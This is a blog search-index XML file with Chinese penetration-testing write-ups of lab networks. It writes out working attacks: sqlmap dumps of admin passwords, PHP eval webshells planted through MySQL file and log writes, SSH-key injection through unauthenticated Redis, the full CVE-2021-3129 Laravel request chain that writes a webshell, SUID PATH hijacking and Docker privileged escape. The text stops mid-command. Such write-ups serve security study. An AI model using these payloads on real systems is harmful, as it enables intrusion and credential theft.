<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>铁三域控</title>
      <link href="/2024/01/22/penetration/%E9%93%81%E4%B8%89%E5%9F%9F%E6%8E%A7/"/>
      <url>/2024/01/22/penetration/%E9%93%81%E4%B8%89%E5%9F%9F%E6%8E%A7/</url>
      
        <content type="html"><![CDATA[<p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20240122100842191.png" alt="image-20240122100842191"></p><p>fscan先粗略扫一遍</p><p>有一个141的永恒之蓝可以利用</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20240122101234048.png" alt="image-20240122101234048"></p><p>123的是一个织梦的cms 拿新学的yakit扫一遍目录</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20240122101844114.png" alt="image-20240122101844114"></p><p>sql目录能进行sqlmap梭</p><p>爆库 sqlmap -u <a href="http://172.25.0.123/sql/?id=2">http://172.25.0.123/sql/?id=2</a> –dbs</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20240122102118718.png" alt="image-20240122102118718"></p><p>爆表 sqlmap -u <a href="http://172.25.0.123/sql/?id=2">http://172.25.0.123/sql/?id=2</a> -D dedecmsv57utf8sp1 –tables</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20240122102143865.png" alt="image-20240122102143865"></p><p>爆字段 sqlmap -u <a href="http://172.25.0.123/sql/?id=2">http://172.25.0.123/sql/?id=2</a> -D dedecmsv57utf8sp1 -T flag –dump</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20240122102404025.png" alt="image-20240122102404025"></p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20240122102935171.png" alt="image-20240122102935171"></p><p>一个后台管理平台 想着能爆数据库那么也能拿管理员密码</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20240122102836711.png" alt="image-20240122102836711"></p><p>这边查一下存放密码字段的表</p><p>sqlmap -u <a href="http://172.25.0.123/sql/?id=2">http://172.25.0.123/sql/?id=2</a> -D dedecmsv57utf8sp1 -T topsec_admin –dump</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20240122112327296.png" alt="image-20240122112327296"></p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20240122112312381.png" alt="image-20240122112312381"></p><p>登录在文件管理处上马 其实没必要 上一次就有flag</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20240122113012933.png" alt="image-20240122113012933"></p><p>redesktop 连接那台141永恒之蓝 密码就是在密码库里爆出来的没加md5的</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20240122142611590.png" alt="image-20240122142611590"></p><p>自带的mimikatza抓一波域密码</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20240122145542263.png" alt="image-20240122145542263"></p><p>直接远程连接拿flag </p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20240122152802811.png" alt="image-20240122152802811"></p>]]></content>
      
      
      <categories>
          
          <category> Penetration </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>attck1</title>
      <link href="/2023/12/17/penetration/attck1/"/>
      <url>/2023/12/17/penetration/attck1/</url>
      
        <content type="html"><![CDATA[<p>红日系列靶场attck1</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/20210413164206482.png" alt="在这里插入图片描述"></p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">攻击者：<br>kali<br><span class="hljs-number">172.17.137.93</span><br><br>windows<br><span class="hljs-number">172.17.137.87</span><br><br>靶场：<br>VM1：对外边界服务器，win7<br><span class="hljs-number">192.168.52.143</span><br><span class="hljs-number">172.17.137.105</span><br><br>VM2：域成员，<span class="hljs-number">2003</span><br><span class="hljs-number">192.168.52.141</span><br><br>VM3：域控，<span class="hljs-number">2008</span><br><span class="hljs-number">192.168.52.138</span><br><br></code></pre></td></tr></table></figure><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231127164203012.png" alt="image-20231127164203012"></p><p>访问80端口 是一个PHP探针</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231127164251109.png" alt="image-20231127164251109"></p><p>mysql数据库有弱密码 root root可以连接</p><p>由于是phpstudy创建的网站 一般会有phpmyadmin</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231127171656942.png" alt="image-20231127171656942"></p><p>进入尝试写入shell</p><p>方案一：直接写入shell</p><p>执行查询语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">show</span> <span class="hljs-keyword">global</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%secure%&#x27;</span><br></code></pre></td></tr></table></figure><p>放secure_file_priv的值为空时可以直接写入shell</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">select &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;re&quot;</span>])<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27; into outfile &#x27;C:/phpstudy/WWW/shell2.php&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231127172038224.png" alt="image-20231127172038224"></p><p>这边的值不为空（NULL不为空）（这意味着MySQL服务器不允许在安全文件目录之外的任何位置进行文件操作） 且secure_auth（安全文件目录）是不存在的 也就是全局禁止文件操作</p><p>解决方案（<a href="https://www.dbs724.com/224656.html%EF%BC%89%E8%BF%99%E4%B8%AA%E6%9B%B4%E6%94%B9%E5%B0%B1%E9%9C%80%E8%A6%81%E6%95%B4%E4%B8%AA%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%9A%84%E6%9D%83%E9%99%90">https://www.dbs724.com/224656.html）这个更改就需要整个计算机的权限</a></p><p>方案二：日志写入shell</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams">show <span class="hljs-keyword">variables</span> like <span class="hljs-comment">&#x27;%general%&#x27;</span><br></code></pre></td></tr></table></figure><p>查看是否开启全局日志记录</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231127173220349.png" alt="image-20231127173220349"></p><p>没有开启时可以通过开启并更改日志路径和日志文件为php文件。通过日志记录一句话木马来利用。</p><p>开启命令：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">set</span> global <span class="hljs-attribute">general_log</span>=ON<br></code></pre></td></tr></table></figure><p> 更改路径命令为：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">set</span> global <span class="hljs-attribute">general_log_file</span>=<span class="hljs-string">&#x27;C:/phpstudy/WWW/c&#x27;</span><br></code></pre></td></tr></table></figure><p>（phpstudy路径？探针里面写的明明白白了）</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231127173556443.png" alt="image-20231127173556443"></p><p>执行成功可以发现全局日志打开 并且日志文件更改为我们设置的shell文件</p><p>此时我们查询的语句会被记录到日志文件中</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">select &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;cmd&quot;</span>])<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27;</span><br></code></pre></td></tr></table></figure><p>蚁剑开连</p><p>systeminfo收集本机信息</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231127174203621.png" alt="image-20231127174203621"></p><p>上线msf</p><p>能出网 反弹shell 添加路由</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231127183516316.png" alt="image-20231127183516316"></p><p>存在192.168.52.0网段</p><p>arp 探测内网存活主机</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros">use post/windows/gather/arp_scanner<br><br><span class="hljs-built_in">set</span> RHOSTS 192.168.52.0/24<br><br><span class="hljs-built_in">set</span> SESSION 1<br><br>exploit<br></code></pre></td></tr></table></figure><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231127202100584.png" alt="image-20231127202100584"></p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231127194532845.png" alt="image-20231127194532845"></p><p>mimikatz读一下密码</p><p>很明显里面存在GOD域控</p>]]></content>
      
      
      <categories>
          
          <category> Penetration </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>attck2</title>
      <link href="/2023/12/17/penetration/attck2/"/>
      <url>/2023/12/17/penetration/attck2/</url>
      
        <content type="html"><![CDATA[<p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231203102647003.png" alt="image-20231203102647003"></p><p>danima</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231204194822984.png" alt="image-20231204194822984"></p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231204194847872.png" alt="image-20231204194847872"></p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231204194731016.png" alt="image-20231204194731016"></p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231204200831924.png" alt="image-20231204200831924"></p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231204200841136.png" alt="image-20231204200841136"></p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231204205330432.png" alt="image-20231204205330432"></p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231204205344634.png" alt="image-20231204205344634"></p>]]></content>
      
      
      <categories>
          
          <category> Penetration </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>attck3</title>
      <link href="/2023/12/17/penetration/attck3/"/>
      <url>/2023/12/17/penetration/attck3/</url>
      
        <content type="html"><![CDATA[<p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231203192547124.png" alt="image-20231203192547124"></p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231203192601414.png" alt="image-20231203192601414"></p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231203192629100.png" alt="image-20231203192629100"></p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231203203611997.png" alt="image-20231203203611997"></p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231203203535589.png" alt="image-20231203203535589"></p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231203203549795.png" alt="image-20231203203549795"></p>]]></content>
      
      
      <categories>
          
          <category> Penetration </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>attck7</title>
      <link href="/2023/12/17/penetration/attck7/"/>
      <url>/2023/12/17/penetration/attck7/</url>
      
        <content type="html"><![CDATA[<p>att ck7靶场</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/1614336174_6038d0ae97a56a0f1e287.png!small" alt="20210226161713.png"></p><h2 id="获取第一台DMZ主机（192-168-52-10）"><a href="#获取第一台DMZ主机（192-168-52-10）" class="headerlink" title="获取第一台DMZ主机（192.168.52.10）"></a>获取第一台DMZ主机（192.168.52.10）</h2><p>拿fscan扫一下 发现有redis未授权访问</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs awk">ssh-keygen -t rsa<br><br>(echo -e <span class="hljs-string">&quot;\n\n&quot;</span>; cat id_rsa.pub; echo -e <span class="hljs-string">&quot;\n\n&quot;</span>) &gt; test.txt <span class="hljs-comment">#将公钥id_rsa.pub文件写入test.txt文件</span><br><br>cat test.txt | redis-cli -h <span class="hljs-number">192.168</span>.<span class="hljs-number">220.129</span> -x set crack<br><br>redis-cli -h xx.xx.xx.xx<br><br>​&gt; config set dir <span class="hljs-regexp">/root/</span>.ssh <span class="hljs-comment">#这步需要redis服务使用root权限开启 否则更改不了路径</span><br><br>​&gt; config set dbfilename authorized_keys<br><br>​&gt;save<br><br>​&gt;<span class="hljs-keyword">exit</span><br><br>cd <span class="hljs-regexp">/root/</span>.ssh<br><br>ssh -i id_rsa root@<span class="hljs-number">172.17</span>.<span class="hljs-number">137.102</span><br></code></pre></td></tr></table></figure><h2 id="第二台主机（192-168-52-20）"><a href="#第二台主机（192-168-52-20）" class="headerlink" title="第二台主机（192.168.52.20）"></a>第二台主机（192.168.52.20）</h2><p>首先是公开在网络上的172.17.137.xx </p><p>一个laravel框架漏洞</p><p>Laravel RCE CVE-2021-3129</p><p>测试漏洞存在</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/_ignition/execute-solution</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.1.8:81<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>328<br><br><span class="language-swift">&#123;</span><br><span class="language-swift">  <span class="hljs-string">&quot;solution&quot;</span>: <span class="hljs-string">&quot;Facade<span class="hljs-subst">\\</span>Ignition<span class="hljs-subst">\\</span>Solutions<span class="hljs-subst">\\</span>MakeViewVariableOptionalSolution&quot;</span>,</span><br><span class="language-swift">  <span class="hljs-string">&quot;parameters&quot;</span>: &#123;</span><br><span class="language-swift">    <span class="hljs-string">&quot;variableName&quot;</span>: <span class="hljs-string">&quot;username&quot;</span>,</span><br><span class="language-swift">    <span class="hljs-string">&quot;viewFile&quot;</span>: <span class="hljs-string">&quot;xxxxx&quot;</span></span><br><span class="language-swift">  &#125;</span><br><span class="language-swift">&#125;</span><br></code></pre></td></tr></table></figure><p>file_put_contents 报错 xxxxxx </p><p>（1）发送如下数据包，将Laravel的原日志文件laravel.log清空：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/_ignition/execute-solution</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.1.8:81<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>328<br><br><span class="language-swift">&#123;</span><br><span class="language-swift">  <span class="hljs-string">&quot;solution&quot;</span>: <span class="hljs-string">&quot;Facade<span class="hljs-subst">\\</span>Ignition<span class="hljs-subst">\\</span>Solutions<span class="hljs-subst">\\</span>MakeViewVariableOptionalSolution&quot;</span>,</span><br><span class="language-swift">  <span class="hljs-string">&quot;parameters&quot;</span>: &#123;</span><br><span class="language-swift">    <span class="hljs-string">&quot;variableName&quot;</span>: <span class="hljs-string">&quot;username&quot;</span>,</span><br><span class="language-swift">    <span class="hljs-string">&quot;viewFile&quot;</span>: <span class="hljs-string">&quot;php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&quot;</span></span><br><span class="language-swift">  &#125;</span><br><span class="language-swift">&#125;</span><br></code></pre></td></tr></table></figure><p>（2）发送如下数据包，给Log增加一次前缀，用于对齐：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/_ignition/execute-solution</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.1.8:81<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>163<br><br><span class="language-swift">&#123;</span><br><span class="language-swift">  <span class="hljs-string">&quot;solution&quot;</span>: <span class="hljs-string">&quot;Facade<span class="hljs-subst">\\</span>Ignition<span class="hljs-subst">\\</span>Solutions<span class="hljs-subst">\\</span>MakeViewVariableOptionalSolution&quot;</span>,</span><br><span class="language-swift">  <span class="hljs-string">&quot;parameters&quot;</span>: &#123;</span><br><span class="language-swift">    <span class="hljs-string">&quot;variableName&quot;</span>: <span class="hljs-string">&quot;username&quot;</span>,</span><br><span class="language-swift">    <span class="hljs-string">&quot;viewFile&quot;</span>: <span class="hljs-string">&quot;AA&quot;</span></span><br><span class="language-swift">  &#125;</span><br><span class="language-swift">&#125;</span><br></code></pre></td></tr></table></figure><p>(3) 在phpggc目录下执行生成exp </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">php -d <span class="hljs-string">&quot;phar.readonly=0&quot;</span> ./phpggc Laravel/RCE5 <span class="hljs-string">&quot;system(&#x27;echo PD9waHAgZXZhbCgkX1BPU1Rbd2hvYW1pXSk7Pz4=|base64 -d &gt; /var/www/html/shell.php&#x27;);&quot;</span> --phar phar -o php://output | <span class="hljs-built_in">base64</span> -w 0 | python -c <span class="hljs-string">&quot;import sys;print(&#x27;&#x27;.join([&#x27;=&#x27; + hex(ord(i))[2:] + &#x27;=00&#x27; for i in sys.stdin.read()]).upper())&quot;</span><br><span class="hljs-comment">#写一个shell</span><br></code></pre></td></tr></table></figure><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231115202747638.png" alt="image-20231115202747638"></p><p>（4）将之前生成的编码后的POC作为viewFile的值，发送数据包：注意在生成的poc段后添加a</p><p>   否则最终laravel.log里面将生成两个POC，导致利用失败</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/_ignition/execute-solution</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.1.8:81<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>5058<br><br><span class="language-dns">&#123;</span><br><span class="language-dns">  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="language-dns">  &quot;parameters&quot;: &#123;</span><br><span class="language-dns">    &quot;variableName&quot;: &quot;username&quot;,</span><br><span class="language-dns">    &quot;viewFile&quot;: &quot;=<span class="hljs-number">50=00=44=00</span>=<span class="hljs-number">39=00=77=00</span>=<span class="hljs-number">61=00=48=00</span>=<span class="hljs-number">41=00=67=00</span>=<span class="hljs-number">58=00=31=00</span>=<span class="hljs-number">39=00=49=00</span>=<span class="hljs-number">51=00=55=00</span>=<span class="hljs-number">78=00=55=00</span>=<span class="hljs-number">58=00=30=00</span>=<span class="hljs-number">4</span>E=<span class="hljs-number">00=50=00=54</span>=<span class="hljs-number">00=56=00=42</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span><span class="hljs-keyword">A</span>=<span class="hljs-number">00=54=00=45</span>=<span class="hljs-number">00</span>=......<span class="hljs-number">2</span>B=<span class="hljs-number">00=57=00=61</span>=<span class="hljs-number">00</span>=<span class="hljs-number">63</span>=<span class="hljs-number">00</span>=<span class="hljs-number">4</span>E=<span class="hljs-number">00=67=00=49</span>=<span class="hljs-number">00=41=00=41</span>=<span class="hljs-number">00=41=00=42</span>=<span class="hljs-number">00=48=00=51</span>=<span class="hljs-number">00</span>=<span class="hljs-number">6</span>B=<span class="hljs-number">00=31=00=43</span>=<span class="hljs-number">00</span>a&quot;</span><br><span class="language-dns">  &#125;</span><br><span class="language-dns">&#125;</span><br></code></pre></td></tr></table></figure><p>（5）发送如下数据包，清空对log文件中的干扰字符，只留下POC：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/_ignition/execute-solution</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.1.8:81<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>299<br><br><span class="language-swift">&#123;</span><br><span class="language-swift">  <span class="hljs-string">&quot;solution&quot;</span>: <span class="hljs-string">&quot;Facade<span class="hljs-subst">\\</span>Ignition<span class="hljs-subst">\\</span>Solutions<span class="hljs-subst">\\</span>MakeViewVariableOptionalSolution&quot;</span>,</span><br><span class="language-swift">  <span class="hljs-string">&quot;parameters&quot;</span>: &#123;</span><br><span class="language-swift">    <span class="hljs-string">&quot;variableName&quot;</span>: <span class="hljs-string">&quot;username&quot;</span>,</span><br><span class="language-swift">    <span class="hljs-string">&quot;viewFile&quot;</span>: <span class="hljs-string">&quot;php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&quot;</span></span><br><span class="language-swift">  &#125;</span><br><span class="language-swift">&#125;</span><br></code></pre></td></tr></table></figure><p>（6）使用<code>phar://</code>进行反序列化，执行任意代码（此时需要使用绝对路径）：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/_ignition/execute-solution</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.1.8:81<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>210<br><br><span class="language-swift">&#123;</span><br><span class="language-swift">  <span class="hljs-string">&quot;solution&quot;</span>: <span class="hljs-string">&quot;Facade<span class="hljs-subst">\\</span>Ignition<span class="hljs-subst">\\</span>Solutions<span class="hljs-subst">\\</span>MakeViewVariableOptionalSolution&quot;</span>,</span><br><span class="language-swift">  <span class="hljs-string">&quot;parameters&quot;</span>: &#123;</span><br><span class="language-swift">    <span class="hljs-string">&quot;variableName&quot;</span>: <span class="hljs-string">&quot;username&quot;</span>,</span><br><span class="language-swift">    <span class="hljs-string">&quot;viewFile&quot;</span>: <span class="hljs-string">&quot;phar:///var/www/storage/logs/laravel.log/test.txt&quot;</span></span><br><span class="language-swift">  &#125;</span><br><span class="language-swift">&#125;</span><br></code></pre></td></tr></table></figure><p>（7）蚁剑生成shell 连接就行</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231115203431120.png" alt="image-20231115203431120"></p><p>查看cgroup可以判断是否在docker里面</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /proc/self/cgroup<br></code></pre></td></tr></table></figure><p><a href="https://zhuanlan.zhihu.com/p/388101355">linux cgroups 详解 - 知乎 (zhihu.com)</a></p><p>轻量级容器 Docker 及k8s中的pod就使用了 cgroups 提供的资源限制能力来完成cpu，内存等部分的资源控制。</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231120182807632.png" alt="image-20231120182807632"></p><p>所以这个服务开放在docker里面</p><p>docker内权限提升</p><p>环境变量提权<a href="https://blog.csdn.net/Fly_hps/article/details/80428173">Linux提权利用SUID提权</a></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">find</span> / -perm <span class="hljs-attribute">-u</span>=s -type f 2&gt;/dev/<span class="hljs-literal">null</span> <br></code></pre></td></tr></table></figure><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231120183108390.png" alt="image-20231120183108390"></p><p>查找具有suid权限的文件 看文件执行结果   一般劫持的有find cp more bash nmap等</p><p>经验</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /tmp <br><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;/bin/bash&quot;</span> &gt; ps<br><br><span class="hljs-built_in">chmod</span> 777 ps <br><br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span> <br><br><span class="hljs-built_in">export</span> PATH=/tmp:<span class="hljs-variable">$PATH</span> <br><br>/home/jobs <br><br>./shell <span class="hljs-comment">#该./shell文件执行结果是ps 所以劫持ps</span><br></code></pre></td></tr></table></figure><p>执行suid文件劫持环境变量进行提权</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231120183350261.png" alt="image-20231120183350261"></p><p>docker特权逃逸 拿第二台主机</p><p>使用特权模式启动容器，可以获取大量设备文件访问权限。因为当管理员执行docker run —privileged时，Docker容器将被允许访问主机上的所有设备，并可以执行mount命令进行挂载</p><p><a href="https://zhuanlan.zhihu.com/p/614513965">Docker 逃逸方法汇总 - 知乎 (zhihu.com)</a></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">cat /proc/self/status |grep Cap<br></code></pre></td></tr></table></figure><p>检查是否以特权模式启动 看Capeff 是否为000000003ffffffffff 或者000001ffffffffff</p><p><img src="https://blog-1318287398.cos.ap-nanjing.myqcloud.com/img/image-20231120183837702.png" alt="image-20231120183837702"></p><p>看逃逸方法 这里选择挂载磁盘 写入ssh公钥 ssh连接</p><p>查看磁盘文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">fdisk -l <span class="hljs-comment">#查看磁盘文件</span><br><span class="hljs-built_in">ls</span> 